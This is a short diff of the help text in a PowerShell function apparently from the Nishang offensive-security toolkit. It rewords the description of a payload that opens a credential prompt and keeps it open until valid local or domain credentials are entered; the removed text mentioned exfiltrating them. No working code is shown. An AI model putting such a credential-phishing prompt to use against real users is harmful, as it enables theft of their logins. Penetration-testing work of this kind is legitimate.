@@ -6,9 +6,7 @@ function Credentials
 Nishang script which opens a user credential prompt.
 
 .DESCRIPTION
-This payload opens a prompt which asks for user credentials and
-does not go away till valid credentials are entered in the prompt.
-The credentials can then exfiltrated using method of choice. 
+This payload opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.
 
 .EXAMPLE
 PS > Credentials
